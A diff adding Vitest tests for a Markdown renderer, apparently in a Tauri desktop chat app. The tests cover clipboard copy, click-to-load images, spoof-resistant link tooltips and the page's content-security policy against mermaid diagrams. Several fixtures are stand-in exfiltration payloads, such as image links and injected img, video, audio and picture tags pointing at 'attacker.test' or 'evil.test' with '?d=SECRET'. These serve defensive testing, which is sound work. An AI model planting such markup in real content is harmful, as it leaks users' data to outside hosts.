@@ -10,11 +10,36 @@ import { Markdown } from "./Markdown";
 import { replyMarkdown } from "./CopyMessage";
 import { LinksProvider } from "./previewContext";
 
+const invoke = vi.fn(async (_cmd: string, _args?: unknown): Promise<unknown> => undefined);
+vi.mock("@tauri-apps/api/core", () => ({ invoke: (cmd: string, args?: unknown) => invoke(cmd, args) }));
+
 const render = (text: string, query?: string) => renderToStaticMarkup(<Markdown text={text} query={query} />);
 
-afterEach(cleanup);
+afterEach(() => {
+  cleanup();
+  invoke.mockReset();
+});
 
 describe("Markdown", () => {
+  it("says Copied only once the clipboard took the code, and says so when it didn't", async () => {
+    const writeText = vi.fn(async (_text: string) => {});
+    vi.stubGlobal("navigator", { ...navigator, clipboard: { writeText } });
+    try {
+      renderDom(<Markdown text={"```sh\nls -la\n```"} />);
+      await userEvent.click(screen.getByRole("button", { name: "Copy" }));
+      expect(writeText).toHaveBeenCalledWith("ls -la\n");
+      await screen.findByRole("button", { name: "Copied" });
+      cleanup();
+      writeText.mockRejectedValueOnce(new DOMException("denied", "NotAllowedError"));
+      renderDom(<Markdown text={"```sh\nls -la\n```"} />);
+      await userEvent.click(screen.getByRole("button", { name: "Copy" }));
+      await screen.findByRole("button", { name: "Couldn't copy" });
+      expect(screen.queryByRole("button", { name: "Copied" })).toBeNull();
+    } finally {
+      vi.unstubAllGlobals();
+    }
+  });
+
   it("highlights tagged code, and guesses the language of untagged code, on every render", () => {
     const untagged = "```\nfn parse(line: &str) -> Option<u32> {\n    let n: u32 = line.trim().parse().ok()?;\n    Some(n)\n}\n```";
     // The highlighter is shared between renders, so the second must come out the same as the first.
@@ -38,21 +63,102 @@ describe("Markdown", () => {
     }
   });
 
-  it("loads a remote image once its placeholder is clicked, without following a link around it", async () => {
-    const preview = vi.fn();
-    const { container } = renderDom(
+  const PNG = "data:image/png;base64,iVBORw==";
+  const linkedImage = (preview: () => void) =>
+    renderDom(
       <LinksProvider preview={preview} web={{ openInBrowser: vi.fn() }} onToast={vi.fn()}>
         <Markdown text="[![chart](https://example.test/p.png)](https://example.test/page)" />
       </LinksProvider>,
-    );
+    ).container;
+  const networkImages = (container: Element) => [...container.querySelectorAll("img")].filter((img) => !img.getAttribute("src")?.startsWith("data:"));
+
+  it("loads a remote image through the app once its placeholder is clicked, without following a link around it", async () => {
+    let answer!: (dataUrl: string) => void;
+    invoke.mockImplementationOnce(() => new Promise((resolve) => (answer = resolve)));
+    const preview = vi.fn();
+    const container = linkedImage(preview);
     expect(container.querySelector("img")).toBeNull();
     await userEvent.click(screen.getByRole("button", { name: /example\.test/ }));
+    expect(invoke).toHaveBeenCalledWith("markdown_image_load", { url: "https://example.test/p.png" });
+    expect(screen.getByRole("button", { name: /example\.test, loading/ })).toBeTruthy();
+    expect(networkImages(container)).toEqual([]);
+    act(() => answer(PNG));
+    await waitFor(() => expect(container.querySelector("img")?.getAttribute("src")).toBe(PNG));
     expect(preview).not.toHaveBeenCalled();
-    expect(container.querySelector("img")?.getAttribute("src")).toBe("https://example.test/p.png");
     expect(container.querySelector("img")?.getAttribute("alt")).toBe("chart");
     expect(screen.queryByRole("button", { name: /example\.test/ })).toBeNull();
     await userEvent.click(container.querySelector("img")!);
     expect(preview).toHaveBeenCalledWith({ kind: "web", url: "https://example.test/page" });
+  });
+
+  it("loads an image with no scheme in its address over https", async () => {
+    invoke.mockResolvedValueOnce(PNG);
+    const { container } = renderDom(<Markdown text="![x](//example.test/p.png)" />);
+    await userEvent.click(screen.getByRole("button", { name: /example\.test/ }));
+    expect(invoke).toHaveBeenCalledWith("markdown_image_load", { url: "https://example.test/p.png" });
+    await waitFor(() => expect(container.querySelector("img")?.getAttribute("src")).toBe(PNG));
+  });
+
+  it("says why a clicked image didn't load, and tries again on the next click", async () => {
+    invoke.mockRejectedValueOnce("That address isn't an image.").mockResolvedValueOnce(PNG);
+    const preview = vi.fn();
+    const container = linkedImage(preview);
+    await userEvent.click(screen.getByRole("button", { name: /example\.test/ }));
+    const failed = await screen.findByRole("button", { name: /didn't load\. That address isn't an image\. Click to try again/ });
+    expect(container.querySelector("img")).toBeNull();
+    await userEvent.click(failed);
+    await waitFor(() => expect(container.querySelector("img")?.getAttribute("src")).toBe(PNG));
+    expect(invoke).toHaveBeenCalledTimes(2);
+    expect(networkImages(container)).toEqual([]);
+    expect(preview).not.toHaveBeenCalled();
+  });
+
+  it("asks again for a different image put where a loaded one was (#488)", async () => {
+    invoke.mockResolvedValueOnce(PNG);
+    const shown = (text: string) => <Markdown text={text} />;
+    const { container, rerender } = renderDom(shown("![a](https://one.test/a.png)"));
+    await userEvent.click(screen.getByRole("button", { name: /one\.test/ }));
+    await waitFor(() => expect(container.querySelector("img")?.getAttribute("src")).toBe(PNG));
+    rerender(shown("![a](https://attacker.test/?d=SECRET)"));
+    expect(container.querySelector("img")).toBeNull();
+    expect(screen.getByRole("button", { name: /attacker\.test, click to load/ })).toBeTruthy();
+    expect(invoke).toHaveBeenCalledTimes(1);
+  });
+
+  it("never shows an image that finishes loading after a different one took its place (#488)", async () => {
+    let answer!: (dataUrl: string) => void;
+    invoke.mockImplementationOnce(() => new Promise((resolve) => (answer = resolve)));
+    const shown = (text: string) => <Markdown text={text} />;
+    const { container, rerender } = renderDom(shown("![a](https://one.test/a.png)"));
+    await userEvent.click(screen.getByRole("button", { name: /one\.test/ }));
+    rerender(shown("![a](https://two.test/b.png)"));
+    act(() => answer(PNG));
+    await Promise.resolve();
+    expect(container.querySelector("img")).toBeNull();
+    expect(screen.getByRole("button", { name: /two\.test, click to load/ })).toBeTruthy();
+  });
+});
+
+describe("A link's tooltip (#471)", () => {
+  const tip = (text: string) =>
+    renderDom(
+      <LinksProvider preview={vi.fn()} web={{ openInBrowser: vi.fn() }} onToast={vi.fn()}>
+        <Markdown text={text} />
+      </LinksProvider>,
+    ).container.querySelector("a")!.title;
+
+  it("starts with the real address whatever title the Markdown gives", () => {
+    const shown = tip('[the docs](https://attacker.test/?d=SECRET "https://docs.python.org/3/\nOpens in the preview")');
+    expect(shown.startsWith("https://attacker.test/?d=SECRET\nOpens in the preview\n")).toBe(true);
+    expect(shown.split("\n")).toEqual(["https://attacker.test/?d=SECRET", "Opens in the preview", "https://docs.python.org/3/ Opens in the preview"]);
+  });
+
+  it("keeps a title's direction overrides from reaching back into the address", () => {
+    expect(tip('[x](https://a.test/ "\u202Eevil")')).toBe("https://a.test/\nOpens in the preview\n\uFFFDevil");
+  });
+
+  it("is just the address and where it opens when the Markdown gives no title", () => {
+    expect(tip("[x](https://a.test/)")).toBe("https://a.test/\nOpens in the preview");
   });
 });
 
@@ -295,6 +401,53 @@ describe("A mermaid diagram in a reply", () => {
       const blocks = [...container.querySelectorAll(".code")];
       await waitFor(() => expect(blocks.filter((b) => diagram(b) || b.querySelector(".code-note"))).toHaveLength(sources.length), { timeout: 90_000 });
       expect(added).toEqual([]);
+    } finally {
+      watch.disconnect();
+    }
+  });
+
+  // Math labels keep their raw HTML and d3 draws an actor's icon, both before `contained` runs, so only the page
+  // policy in index.html stands between these elements and a request (#465).
+  it("puts nothing into the page while it draws that the page policy would let load", { timeout: LONG }, async () => {
+    const policy = (readFileSync("index.html", "utf8") as string).match(/Content-Security-Policy"\s+content="([^"]*)"/)![1];
+    const sourcesFor = (directive: string) => policy.split(";").map((d) => d.trim().split(/\s+/)).find(([name]) => name === directive)?.slice(1);
+    const allows = (directive: "img-src" | "media-src", url: string) => {
+      const sources = sourcesFor(directive) ?? sourcesFor("default-src");
+      if (!sources) return true;
+      const target = new URL(url, location.href);
+      return sources.some((s) => (s === "'self'" ? target.origin === location.origin : s.endsWith(":") && target.protocol === s));
+    };
+    const urls = (el: Element, attribute: string) =>
+      (attribute === "srcset" ? (el.getAttribute(attribute) ?? "").split(",").map((c) => c.trim().split(/\s+/)[0]) : [el.getAttribute(attribute) ?? ""]).filter(Boolean);
+    const loads: [string, "img-src" | "media-src", string[]][] = [
+      ["img, picture source, input[type=image]", "img-src", ["src", "srcset"]],
+      ["video", "img-src", ["poster"]],
+      ["audio, video, audio source, video source", "media-src", ["src"]],
+      ["image", "img-src", ["href", "xlink:href"]],
+    ];
+    const letThrough = new Set<string>();
+    const watch = new MutationObserver((records) =>
+      records.forEach((r) =>
+        r.addedNodes.forEach((n) => {
+          if (!(n instanceof Element)) return;
+          for (const el of [n, ...n.querySelectorAll("*")])
+            for (const [selector, directive, attributes] of loads)
+              if (el.matches(selector))
+                for (const attribute of attributes) for (const url of urls(el, attribute)) if (allows(directive, url)) letThrough.add(`${el.localName} ${attribute}=${url}`);
+        }),
+      ),
+    );
+    watch.observe(document.documentElement, { subtree: true, childList: true });
+    try {
+      const message = (html: string) => `sequenceDiagram\n  participant A\n  participant B\n  A->>B: $$x$$ ${html}`;
+      await drawnAfter([
+        message("<img src=https://evil.test/m.png?d=SECRET>"),
+        'sequenceDiagram\n  participant A\n  participant B\n  properties A: {"class": "internal-service-actor", "icon": "https://evil.test/icon.png"}\n  A->>B: hi',
+        message("<video poster=https://evil.test/poster.png></video><audio src=https://evil.test/a.mp3 preload=auto></audio>"),
+        message("<picture><source srcset=https://evil.test/p.png><img></picture>"),
+        message("<input type=image src=https://evil.test/i.png>"),
+      ]);
+      expect([...letThrough]).toEqual([]);
     } finally {
       watch.disconnect();
     }
